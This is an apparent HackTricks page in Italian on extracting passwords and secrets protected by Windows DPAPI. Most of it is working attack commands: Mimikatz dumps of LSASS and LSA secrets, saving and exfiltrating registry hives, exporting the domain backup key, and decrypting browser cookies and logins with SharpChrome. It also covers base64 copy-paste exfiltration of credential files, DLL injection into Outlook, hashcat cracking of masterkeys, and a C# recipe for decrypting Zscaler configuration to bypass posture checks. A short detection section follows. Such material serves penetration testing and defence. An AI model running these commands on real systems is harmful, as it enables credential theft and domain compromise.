# DPAPI - Estrazione delle password

{{#include ../../banners/hacktricks-training.md}}



## Cos'è DPAPI

La Data Protection API (DPAPI) viene utilizzata principalmente nel sistema operativo Windows per la **crittografia simmetrica delle chiavi private asimmetriche**, sfruttando i segreti dell'utente o del sistema come fonte significativa di entropia. Questo approccio semplifica la crittografia per gli sviluppatori, consentendo loro di crittografare i dati utilizzando una chiave derivata dai segreti di accesso dell'utente o, nel caso della crittografia del sistema, dai segreti di autenticazione del dominio del sistema, eliminando così la necessità per gli sviluppatori di gestire autonomamente la protezione della chiave di crittografia.

Il modo più comune di utilizzare DPAPI consiste nell'impiegare le funzioni **`CryptProtectData` e `CryptUnprotectData`**, che consentono alle applicazioni di crittografare e decrittografare i dati utilizzando il contesto di sicurezza del processo attualmente connesso. Per impostazione predefinita, i dati possono essere decrittografati solo dallo stesso utente o contesto di sistema che li ha crittografati.<sup>[[2]](#references)[[3]](#references)</sup>

Queste funzioni accettano anche un **parametro di entropia** facoltativo, utilizzato durante la crittografia e la decrittografia. I dati protetti con entropia facoltativa richiedono lo stesso valore di entropia per la decrittografia.<sup>[[2]](#references)[[6]](#references)</sup>

### Generazione della chiave dell'utente

DPAPI deriva un valore specifico per l'utente, spesso chiamato **pre-key**, dalle credenziali dell'utente. La derivazione esatta dipende dall'account e dalla versione del sistema operativo. Ad esempio, Impacket prova un percorso HMAC-SHA1 basato sul digest SHA-1 della password UTF-16LE, un altro basato sull'hash MD4/NT della password e un percorso derivato da PBKDF2-SHA256 per gli utenti protetti. Questo spiega perché gli strumenti offline possono spesso derivare il materiale necessario dalla password in chiaro o da un hash NT disponibile.<sup>[[2]](#references)[[10]](#references)</sup>

Questo è particolarmente interessante perché, se un attacker riesce a ottenere l'hash della password dell'utente, può:

- **Decrittografare qualsiasi dato crittografato utilizzando DPAPI** con la chiave di quell'utente senza dover contattare alcuna API
- Provare a **crackare la password** offline tentando di generare la chiave DPAPI valida

DPAPI mantiene una o più **master keys** per ogni utente, invece di creare una nuova master key per ogni blob protetto. Ogni master key ha un **GUID** (Globally Unique Identifier) e un blob crittografato registra quale master key lo protegge.<sup>[[2]](#references)</sup>

Le master keys sono archiviate nella directory **`%APPDATA%\Microsoft\Protect\<sid>\<guid>`**, dove `{SID}` è il Security Identifier dell'utente. Il file della master key contiene materiale protetto dalla **pre-key** dell'utente e, per gli utenti di dominio, materiale di recupero protetto da una **domain backup key**.<sup>[[2]](#references)</sup>

Si noti che la **domain key utilizzata per crittografare la master key si trova sui domain controller e non cambia mai**; pertanto, se un attacker ha accesso al domain controller, può recuperare la domain backup key e decrittografare le master keys di tutti gli utenti del dominio.<sup>[[2]](#references)</sup>

I blob crittografati contengono negli header il **GUID della master key** utilizzata per crittografare i dati.

> [!TIP]
> I blob crittografati con DPAPI iniziano con **`01 00 00 00`**

Individuazione delle master keys:
```bash
Get-ChildItem C:\Users\USER\AppData\Roaming\Microsoft\Protect\
Get-ChildItem C:\Users\USER\AppData\Local\Microsoft\Protect
Get-ChildItem -Hidden C:\Users\USER\AppData\Roaming\Microsoft\Protect\
Get-ChildItem -Hidden C:\Users\USER\AppData\Local\Microsoft\Protect\
Get-ChildItem -Hidden C:\Users\USER\AppData\Roaming\Microsoft\Protect\{SID}
Get-ChildItem -Hidden C:\Users\USER\AppData\Local\Microsoft\Protect\{SID}
```
Questo è l'aspetto che avrà un insieme di Master Keys di un utente:

![Cos'è DPAPI - Generazione delle chiavi utente: questo è l'aspetto che avrà un insieme di Master Keys di un utente](<../../images/image (1121).png>)

### Generazione delle chiavi Machine/System

Questa è la chiave utilizzata dalla macchina per cifrare i dati. Si basa sul **segreto LSA DPAPI_SYSTEM**, una chiave speciale a cui può accedere solo l'utente SYSTEM. Questa chiave viene utilizzata per cifrare i dati che devono essere accessibili dal sistema stesso, come le credenziali a livello macchina o i segreti a livello di sistema.<sup>[[2]](#references)</sup>

Si noti che queste chiavi **non dispongono di un backup di dominio**, quindi sono accessibili solo localmente:

- **Mimikatz** può accedervi eseguendo il dump dei segreti LSA con il comando: `mimikatz lsadump::secrets`
- Il segreto è memorizzato nel registry, quindi un amministratore potrebbe **modificare i permessi DACL per accedervi**. Il percorso del registry è: `HKEY_LOCAL_MACHINE\SECURITY\Policy\Secrets\DPAPI_SYSTEM`
- È anche possibile eseguire l'estrazione offline dagli hive del registry. Ad esempio, in qualità di amministratore sul target, salvare gli hive ed esfiltrarli:
```cmd
reg save HKLM\SYSTEM C:\Windows\Temp\system.hiv
reg save HKLM\SECURITY C:\Windows\Temp\security.hiv
```
Quindi, sulla tua macchina di analisi, recupera il segreto LSA DPAPI_SYSTEM dagli hive e usalo per decrittografare i blob con ambito macchina (password delle attività pianificate, credenziali dei servizi, profili Wi‑Fi, ecc.):
```text
mimikatz lsadump::secrets /system:C:\path\system.hiv /security:C:\path\security.hiv
# Look for the DPAPI_SYSTEM secret in the output
```
### Dati protetti da DPAPI

Tra i dati personali protetti da DPAPI ci sono:

- Credenziali Windows
- Password e dati di completamento automatico di Internet Explorer e Google Chrome
- Password degli account e-mail e FTP interni per applicazioni come Outlook e Windows Mail
- Password per cartelle condivise, risorse, reti wireless e Windows Vault, incluse le chiavi di crittografia
- Password per connessioni remote desktop, .NET Passport e chiavi private per vari scopi di crittografia e autenticazione
- Password di rete gestite da Credential Manager e dati personali nelle applicazioni che usano CryptProtectData, come Skype, MSN messenger e altre
- Blob crittografati all'interno del registro
- ...

I dati protetti dal sistema includono:
- Password Wi-Fi
- Password delle attività pianificate
- ...

### Opzioni per l'estrazione delle master key

- Se l'utente dispone dei privilegi di domain admin, può accedere alla **domain backup key** per decrittografare tutte le master key degli utenti nel dominio:
```bash
# Mimikatz
lsadump::backupkeys /system:<DOMAIN CONTROLLER> /export

# SharpDPAPI
SharpDPAPI.exe backupkey [/server:SERVER.domain] [/file:key.pvk]
```
- Con privilegi di amministratore locale, è possibile **accedere alla memoria di LSASS** per estrarre le chiavi master DPAPI di tutti gli utenti connessi e la chiave SYSTEM.
```bash
# Mimikatz
mimikatz sekurlsa::dpapi
```
- Se l'utente dispone di privilegi di amministratore locale, può accedere al **segreto LSA DPAPI_SYSTEM** per decrittografare le chiavi master della macchina:
```bash
# Mimikatz
lsadump::secrets /system:DPAPI_SYSTEM /export
```
- Se la password o l'hash NTLM dell'utente è noto, puoi **decrittografare direttamente le master keys dell'utente**:
```bash
# Mimikatz
dpapi::masterkey /in:<C:\PATH\MASTERKEY_LOCATON> /sid:<USER_SID> /password:<USER_PLAINTEXT> /protected

# SharpDPAPI
SharpDPAPI.exe masterkeys /password:PASSWORD
```
- Se ti trovi all'interno di una sessione come l'utente, è possibile chiedere al DC la **backup key per decrittografare le master keys usando RPC**. Se sei amministratore locale e l'utente ha effettuato l'accesso, potresti **rubare il suo session token** per questo:
```bash
# Mimikatz
dpapi::masterkey /in:"C:\Users\USER\AppData\Roaming\Microsoft\Protect\SID\GUID" /rpc

# SharpDPAPI
SharpDPAPI.exe masterkeys /rpc
```
## Elenca Vault
```bash
# From cmd
vaultcmd /listcreds:"Windows Credentials" /all

# From mimikatz
mimikatz vault::list
```
## Accedere ai dati crittografati con DPAPI

### Trovare i dati crittografati con DPAPI

I file comunemente **protetti dagli utenti** si trovano in:

- `C:\Users\username\AppData\Roaming\Microsoft\Protect\*`
- `C:\Users\username\AppData\Roaming\Microsoft\Credentials\*`
- `C:\Users\username\AppData\Roaming\Microsoft\Vault\*`
- Verificare anche sostituendo `\Roaming\` con `\Local\` nei percorsi precedenti.

Esempi di enumerazione:
```bash
dir /a:h C:\Users\username\AppData\Local\Microsoft\Credentials\
dir /a:h C:\Users\username\AppData\Roaming\Microsoft\Credentials\
Get-ChildItem -Hidden C:\Users\username\AppData\Local\Microsoft\Credentials\
Get-ChildItem -Hidden C:\Users\username\AppData\Roaming\Microsoft\Credentials\
```
[**SharpDPAPI**](https://github.com/GhostPack/SharpDPAPI) può trovare blob crittografati con DPAPI nel file system, nel registro e nei blob B64:<sup>[[12]](#references)</sup>
```bash
# Search blobs in the registry
search /type:registry [/path:HKLM] # Search complete registry by default

# Search blobs in folders
search /type:folder /path:C:\path\to\folder
search /type:folder /path:C:\Users\username\AppData\

# Search a blob inside a file
search /type:file /path:C:\path\to\file

# Search a blob inside B64 encoded data
search /type:base64 [/base:<base64 string>]
```
Nota che [**SharpChrome**](https://github.com/GhostPack/SharpDPAPI) (dallo stesso repo) può essere usato per decrittografare dati sensibili come i cookies tramite DPAPI.<sup>[[12]](#references)</sup>

#### Ricette rapide per Chromium/Edge/Electron (SharpChrome)

- Utente corrente, decrittografia interattiva di accessi/cookies salvati (funziona anche con gli app-bound cookies di Chrome 127+ perché la chiave aggiuntiva viene recuperata dal Credential Manager dell'utente quando viene eseguito nel contesto dell'utente):
```cmd
SharpChrome logins  /browser:edge  /unprotect
SharpChrome cookies /browser:chrome /format:csv /unprotect
```
- Analisi offline quando si hanno solo i file. Per prima cosa estrai la chiave dello stato AES dal "Local State" del profilo, quindi usala per decrittografare il database dei cookie:
```cmd
# Dump the AES state key from Local State (DPAPI will be used if running as the user)
SharpChrome statekeys /target:"C:\Users\bob\AppData\Local\Google\Chrome\User Data\Local State" /unprotect
# Copy the hex state key value (e.g., "48F5...AB") and pass it to cookies
SharpChrome cookies /target:"C:\Users\bob\AppData\Local\Google\Chrome\User Data\Default\Cookies" /statekey:48F5...AB /format:json
```
- Triage a livello di dominio/remoto quando si dispone della chiave di backup del dominio DPAPI (PVK) e dei privilegi di amministratore sull'host target:
```cmd
SharpChrome cookies /server:HOST01 /browser:edge /pvk:BASE64
SharpChrome logins  /server:HOST01 /browser:chrome /pvk:key.pvk
```
- Se disponi della prekey/credkey DPAPI di un utente (da LSASS), puoi saltare il password cracking e decrittografare direttamente i dati del profilo:
```cmd
# For SharpChrome use /prekey; for SharpDPAPI use /credkey
SharpChrome cookies /browser:edge /prekey:SHA1_HEX
SharpDPAPI.exe credentials /credkey:SHA1_HEX
```
Note
- Le build più recenti di Chrome/Edge possono memorizzare determinati cookie utilizzando la crittografia "App-Bound". La decrittografia offline di questi cookie specifici non è possibile senza la chiave app-bound aggiuntiva; esegui SharpChrome nel contesto dell'utente target per recuperarla automaticamente. Consulta il post sul blog relativo alla sicurezza di Chrome indicato di seguito.<sup>[[5]](#references)</sup>

### Chiavi di accesso e dati

- **Usa SharpDPAPI** per ottenere le credenziali dai file crittografati con DPAPI della sessione corrente:
```bash
# Decrypt user data
## Note that 'triage' is like running credentials, vaults, rdg and certificates
SharpDPAPI.exe [credentials|vaults|rdg|keepass|certificates|triage] /unprotect

# Decrypt machine data
SharpDPAPI.exe machinetriage
```
- **Ottenere informazioni sulle credenziali** come i dati crittografati e il guidMasterKey.<sup>[[3]](#references)</sup>
```bash
mimikatz dpapi::cred /in:C:\Users\<username>\AppData\Local\Microsoft\Credentials\28350839752B38B238E5D56FDD7891A7

[...]
guidMasterKey      : {3e90dd9e-f901-40a1-b691-84d7f647b8fe}
[...]
pbData             : b8f619[...snip...]b493fe
[..]
```
- **Access masterkeys**:

Decrypt a masterkey of a user requesting the **domain backup key** using RPC:
```bash
# Mimikatz
dpapi::masterkey /in:"C:\Users\USER\AppData\Roaming\Microsoft\Protect\SID\GUID" /rpc

# SharpDPAPI
SharpDPAPI.exe masterkeys /rpc
```
Lo strumento **SharpDPAPI** supporta anche questi argomenti per la decrittografia delle masterkey (si noti come sia possibile usare `/rpc` per ottenere la chiave di backup del dominio, `/password` per usare una password in chiaro o `/pvk` per specificare un file della chiave privata del dominio DPAPI...):<sup>[[12]](#references)</sup>
```
/target:FILE/folder     -   triage a specific masterkey, or a folder full of masterkeys (otherwise triage local masterkeys)
/pvk:BASE64...          -   use a base64'ed DPAPI domain private key file to first decrypt reachable user masterkeys
/pvk:key.pvk            -   use a DPAPI domain private key file to first decrypt reachable user masterkeys
/password:X             -   decrypt the target user's masterkeys using a plaintext password (works remotely)
/ntlm:X                 -   decrypt the target user's masterkeys using a NTLM hash (works remotely)
/credkey:X              -   decrypt the target user's masterkeys using a DPAPI credkey (domain or local SHA1, works remotely)
/rpc                    -   decrypt the target user's masterkeys by asking domain controller to do so
/server:SERVER          -   triage a remote server, assuming admin access
/hashes                 -   output usermasterkey file 'hashes' in JTR/Hashcat format (no decryption)
```
- **Decrittare i dati utilizzando una masterkey**:
```bash
# Mimikatz
dpapi::cred /in:C:\path\to\encrypted\file /masterkey:<MASTERKEY>

# SharpDPAPI
SharpDPAPI.exe /target:<FILE/folder> /ntlm:<NTLM_HASH>
```
Lo strumento **SharpDPAPI** supporta anche questi argomenti per la decryption di `credentials|vaults|rdg|keepass|triage|blob|ps` (nota come sia possibile usare `/rpc` per ottenere la domain backup key, `/password` per usare una password in chiaro, `/pvk` per specificare un file con la private key DPAPI del dominio, `/unprotect` per usare la sessione dell'utente corrente...):<sup>[[12]](#references)</sup>
```
Decryption:
/unprotect          -   force use of CryptUnprotectData() for 'ps', 'rdg', or 'blob' commands
/pvk:BASE64...      -   use a base64'ed DPAPI domain private key file to first decrypt reachable user masterkeys
/pvk:key.pvk        -   use a DPAPI domain private key file to first decrypt reachable user masterkeys
/password:X         -   decrypt the target user's masterkeys using a plaintext password (works remotely)
/ntlm:X             -   decrypt the target user's masterkeys using a NTLM hash (works remotely)
/credkey:X          -   decrypt the target user's masterkeys using a DPAPI credkey (domain or local SHA1, works remotely)
/rpc                -   decrypt the target user's masterkeys by asking domain controller to do so
GUID1:SHA1 ...      -   use a one or more GUID:SHA1 masterkeys for decryption
/mkfile:FILE        -   use a file of one or more GUID:SHA1 masterkeys for decryption

Targeting:
/target:FILE/folder -   triage a specific 'Credentials','.rdg|RDCMan.settings', 'blob', or 'ps' file location, or 'Vault' folder
/server:SERVER      -   triage a remote server, assuming admin access
Note: must use with /pvk:KEY or /password:X
Note: not applicable to 'blob' or 'ps' commands
```
- Utilizzo diretto di una DPAPI prekey/credkey (non è necessaria alcuna password)

Se puoi eseguire il dump di LSASS, Mimikatz spesso espone una chiave DPAPI per ogni logon che può essere utilizzata per decrittografare le masterkey dell’utente senza conoscere la password in chiaro. Passa questo valore direttamente allo strumento:
```cmd
# SharpDPAPI accepts the "credkey" (domain or local SHA1)
SharpDPAPI.exe triage /credkey:SHA1_HEX

# SharpChrome accepts the same value as a "prekey"
SharpChrome logins /browser:edge /prekey:SHA1_HEX
```
- Decifrare alcuni dati utilizzando la **sessione dell'utente corrente**:
```bash
# Mimikatz
dpapi::blob /in:C:\path\to\encrypted\file /unprotect

# SharpDPAPI
SharpDPAPI.exe blob /target:C:\path\to\encrypted\file /unprotect
```
---

### Decrittazione offline con Impacket dpapi.py

Se disponi del SID e della password dell’utente vittima (o dell’hash NT), puoi decrittare completamente offline le masterkey DPAPI e i blob di Credential Manager usando dpapi.py di Impacket.<sup>[[10]](#references)[[11]](#references)</sup>

- Identifica gli artefatti sul disco:
- Credential Manager blob(s): %APPDATA%\Microsoft\Credentials\<hex>
- Masterkey corrispondente: %APPDATA%\Microsoft\Protect\<SID>\{GUID}

- Se gli strumenti di file transfer sono inaffidabili, converti i file in base64 sull’host e copia l’output:
```powershell
# Base64-encode files for copy/paste exfil
[Convert]::ToBase64String([IO.File]::ReadAllBytes("$env:APPDATA\Microsoft\Credentials\C8D69E...B9"))
[Convert]::ToBase64String([IO.File]::ReadAllBytes("$env:APPDATA\Microsoft\Protect\<SID>\556a2412-1275-4ccf-b721-e6a0b4f90407"))
```
- Decrittografa la masterkey con il SID e la password/hash dell’utente:
```bash
# Plaintext password
python3 dpapi.py masterkey -file 556a2412-1275-4ccf-b721-e6a0b4f90407 \
-sid S-1-5-21-1111-2222-3333-1107 -password 'UserPassword!'

# Or with NT hash
python3 dpapi.py masterkey -file 556a2412-1275-4ccf-b721-e6a0b4f90407 \
-sid S-1-5-21-1111-2222-3333-1107 -key 0x<NTLM_HEX>
```
- Usa la masterkey decrittografata per decrittografare il credential blob:
```bash
python3 dpapi.py credential -file C8D69EBE9A43E9DEBF6B5FBD48B521B9 -key 0x<MASTERKEY_HEX>
# Expect output like: Type=CRED_TYPE_DOMAIN_PASSWORD; Target=Domain:target=DOMAIN
# Username=<user> ; Password=<cleartext>
```
Questo workflow recupera spesso le credenziali di dominio salvate dalle app utilizzando Windows Credential Manager, inclusi gli account amministrativi (ad es. `*_adm`).

---

### Gestione dell'entropy opzionale ("Third-party entropy")

Alcune applicazioni passano un valore di **entropy** aggiuntivo a `CryptProtectData`. Senza questo valore, il blob non può essere decrittografato, anche se la masterkey corretta è nota. Ottenere l'entropy è quindi essenziale quando si prendono di mira credenziali protette in questo modo (ad es. Microsoft Outlook, alcuni client VPN).

[**EntropyCapture**](https://github.com/SpecterOps/EntropyCapture) (2022) è una DLL user-mode che esegue hooking sulle funzioni DPAPI all'interno del processo target e registra in modo trasparente qualsiasi entropy opzionale fornita. Eseguendo EntropyCapture in modalità **DLL-injection** contro processi come `outlook.exe` o `vpnclient.exe`, verrà prodotto un file che associa ogni buffer di entropy al processo chiamante e al blob. L'entropy acquisita può essere fornita successivamente a **SharpDPAPI** (`/entropy:`) o **Mimikatz** (`/entropy:<file>`) per decrittografare i dati.<sup>[[6]](#references)</sup>
```powershell
# Inject EntropyCapture into the current user's Outlook
InjectDLL.exe -pid (Get-Process outlook).Id -dll EntropyCapture.dll

# Later decrypt a credential blob that required entropy
SharpDPAPI.exe blob /target:secret.cred /entropy:entropy.bin /ntlm:<hash>
```
### Cracking delle masterkey offline (Hashcat & DPAPISnoop)

Microsoft ha introdotto un formato di masterkey **context 3** a partire da Windows 10 v1607 (2016). `hashcat` v6.2.6 (dicembre 2023) ha aggiunto gli hash-mode **22100** (DPAPI masterkey v1 context ), **22101** (context 1) e **22102** (context 3), consentendo il cracking accelerato dalla GPU delle password degli utenti direttamente dal file masterkey. Gli attaccanti possono quindi eseguire attacchi con word-list o brute-force senza interagire con il sistema target.<sup>[[7]](#references)</sup>

`DPAPISnoop` (2024) automatizza il processo:
```bash
# Parse a whole Protect folder, generate hashcat format and crack
DPAPISnoop.exe masterkey-parse C:\Users\bob\AppData\Roaming\Microsoft\Protect\<sid> --mode hashcat --outfile bob.hc
hashcat -m 22102 bob.hc wordlist.txt -O -w4
```
Il tool può anche analizzare i Credential e Vault blob, decrittografarli con chiavi crackate ed esportare le password in chiaro.<sup>[[8]](#references)</sup>


### Accedere ai dati di un'altra macchina

In **SharpDPAPI e SharpChrome** puoi specificare l'opzione **`/server:HOST`** per accedere ai dati di una macchina remota. Naturalmente devi poter accedere a quella macchina e, nell'esempio seguente, si presume che la **domain backup encryption key sia nota**:
```bash
SharpDPAPI.exe triage /server:HOST /pvk:BASE64
SharpChrome cookies /server:HOST /pvk:BASE64
```
## Altri strumenti

### HEKATOMB

[**HEKATOMB**](https://github.com/Processus-Thief/HEKATOMB) è uno strumento che automatizza l'estrazione di tutti gli utenti e computer dalla directory LDAP e l'estrazione della domain controller backup key tramite RPC. Lo script risolverà quindi l'indirizzo IP di tutti i computer ed eseguirà un smbclient su tutti i computer per recuperare tutti i DPAPI blob di tutti gli utenti e decrittografare tutto con la domain backup key.

`python3 hekatomb.py -hashes :ed0052e5a66b1c8e942cc9481a50d56 DOMAIN.local/administrator@10.0.0.1 -debug -dnstcp`

Con l'elenco dei computer estratto da LDAP puoi trovare ogni subnet anche se non la conoscevi!

### DonPAPI 2.x (2024-05)

[**DonPAPI**](https://github.com/login-securite/DonPAPI) può eseguire automaticamente il dump dei secret protetti da DPAPI. La release 2.x ha introdotto:<sup>[[9]](#references)</sup>

* Raccolta parallela di blob da centinaia di host
* Parsing delle masterkey di **context 3** e integrazione automatica con il cracking di Hashcat
* Supporto per i cookie crittografati "App-Bound" di Chrome (vedi la sezione successiva)
* Una nuova modalità **`--snapshot`** per interrogare ripetutamente gli endpoint e rilevare le differenze nei blob appena creati

### DPAPISnoop

[**DPAPISnoop**](https://github.com/Leftp/DPAPISnoop) è un parser C# per file masterkey/credential/vault che può produrre formati Hashcat/JtR e, facoltativamente, avviare automaticamente il cracking. Supporta completamente i formati machine e user masterkey fino a Windows 11 24H1.<sup>[[8]](#references)</sup>


## Rilevamenti comuni

- Accesso ai file in `C:\Users\*\AppData\Roaming\Microsoft\Protect\*`, `C:\Users\*\AppData\Roaming\Microsoft\Credentials\*` e in altre directory correlate a DPAPI.
- Soprattutto da una network share come **C$** o **ADMIN$**.
- Utilizzo di **Mimikatz**, **SharpDPAPI** o strumenti simili per accedere alla memoria di LSASS o eseguire il dump delle masterkey.
- Evento **4662**: *An operation was performed on an object* – può essere correlato all'accesso all'oggetto **`BCKUPKEY`**.
- Evento **4673/4674** quando un processo richiede *SeTrustedCredManAccessPrivilege* (Credential Manager)

---
### Vulnerabilità e cambiamenti dell'ecosistema 2023-2025

* **CVE-2023-36004 – Windows DPAPI Secure Channel Spoofing** (novembre 2023). Un attacker con accesso alla rete poteva indurre un domain member a recuperare una DPAPI backup key dannosa, consentendo la decrittografia delle masterkey degli utenti. Risolto nel cumulative update di novembre 2023: gli amministratori dovrebbero assicurarsi che DC e workstation siano completamente aggiornati.<sup>[[4]](#references)</sup>
* **Crittografia dei cookie “App-Bound” di Chrome 127** (luglio 2024): ha sostituito la protezione legacy basata esclusivamente su DPAPI con una chiave aggiuntiva archiviata nel **Credential Manager** dell'utente. La decrittografia offline dei cookie ora richiede sia la masterkey DPAPI sia l'**app-bound key con wrapping GCM**. SharpChrome v2.3 e DonPAPI 2.x sono in grado di recuperare la chiave aggiuntiva quando vengono eseguiti con il contesto dell'utente.<sup>[[5]](#references)</sup>


### Case Study: Zscaler Client Connector – Custom Entropy Derived From SID

Zscaler Client Connector archivia diversi file di configurazione in `C:\ProgramData\Zscaler` (ad esempio `config.dat`, `users.dat`, `*.ztc`, `*.mtt`, `*.mtc`, `*.mtp`). Ogni file è crittografato con **DPAPI (Machine scope)**, ma il vendor fornisce una **custom entropy** che viene *calcolata a runtime* invece di essere archiviata su disco.<sup>[[1]](#references)</sup>

L'entropy viene ricostruita a partire da due elementi:

1. Un secret hard-coded incorporato in `ZSACredentialProvider.dll`.
2. Il **SID** dell'account Windows a cui appartiene la configurazione.

L'algoritmo implementato dalla DLL è equivalente a:
```csharp
byte[] secret = Encoding.UTF8.GetBytes(HARDCODED_SECRET);
byte[] sid    = Encoding.UTF8.GetBytes(CurrentUserSID);

// XOR the two buffers byte-by-byte
byte[] tmp = new byte[secret.Length];
for (int i = 0; i < secret.Length; i++)
tmp[i] = (byte)(sid[i] ^ secret[i]);

// Split in half and XOR both halves together to create the final entropy buffer
byte[] entropy = new byte[tmp.Length / 2];
for (int i = 0; i < entropy.Length; i++)
entropy[i] = (byte)(tmp[i] ^ tmp[i + entropy.Length]);
```
Poiché il segreto è incorporato in una DLL che può essere letta dal disco, **qualsiasi attaccante locale con diritti SYSTEM può rigenerare l'entropia per qualsiasi SID** e decrittografare i blob offline:
```csharp
byte[] blob = File.ReadAllBytes(@"C:\ProgramData\Zscaler\<SID>++config.dat");
byte[] clear = ProtectedData.Unprotect(blob, RebuildEntropy(secret, sid), DataProtectionScope.LocalMachine);
Console.WriteLine(Encoding.UTF8.GetString(clear));
```
La decrittazione restituisce la configurazione JSON completa, inclusi ogni **device posture check** e il relativo valore previsto: informazioni molto preziose quando si tentano bypass lato client.

> TIP: gli altri artefatti cifrati (`*.mtt`, `*.mtp`, `*.mtc`, `*.ztc`) sono protetti con DPAPI **senza** entropia (`16` byte nulli). Possono quindi essere decrittati direttamente con `ProtectedData.Unprotect` una volta ottenuti i privilegi SYSTEM.

## References

- [1] [Synacktiv – Dovresti fidarti del tuo zero trust? Bypass dei controlli di postura di Zscaler](https://www.synacktiv.com/en/publications/should-you-trust-your-zero-trust-bypassing-zscaler-posture-checks.html)
- [2] [Segreti DPAPI. Analisi della sicurezza e recupero dei dati in DPAPI](https://www.passcape.com/index.php?section=docsys&cmd=details&id=28#13)
- [3] [Lettura dei segreti cifrati con DPAPI tramite Mimikatz e C++](https://www.ired.team/offensive-security/credential-access-and-credential-dumping/reading-dpapi-encrypted-secrets-with-mimikatz-and-c++#using-dpapis-to-encrypt-decrypt-data-in-c)
- [4] [CVE-2023-36004 - Vulnerabilità di spoofing di Windows DPAPI (Data Protection Application Programming Interface)](https://msrc.microsoft.com/update-guide/vulnerability/CVE-2023-36004)
- [5] [Migliorare la sicurezza dei cookie di Chrome su Windows](https://security.googleblog.com/2024/07/improving-security-of-chrome-cookies-on.html)
- [6] [EntropyCapture: estrazione semplice dell'entropia opzionale di DPAPI](https://specterops.io/blog/2022/05/18/entropycapture-simple-extraction-of-dpapi-optional-entropy/)
- [7] [Note di rilascio di hashcat v6.2.6](https://github.com/Hashcat/Hashcat/releases/tag/v6.2.6)
- [8] [DPAPISnoop – repository GitHub](https://github.com/Leftp/DPAPISnoop)
- [9] [DonPAPI 2.0.1 – pagina del progetto PyPI](https://pypi.org/project/donpapi/2.0.0/)
- [10] [Impacket – dpapi.py](https://github.com/fortra/impacket)
- [11] [HTB Puppy: abuso degli ACL di AD, cracking di Argon2 di KeePassXC e decrittazione DPAPI fino all'amministratore del DC](https://0xdf.gitlab.io/2025/09/27/htb-puppy.html)
- [12] [GhostPack SharpDPAPI/SharpChrome – utilizzo e opzioni](https://github.com/GhostPack/SharpDPAPI)
{{#include ../../banners/hacktricks-training.md}}
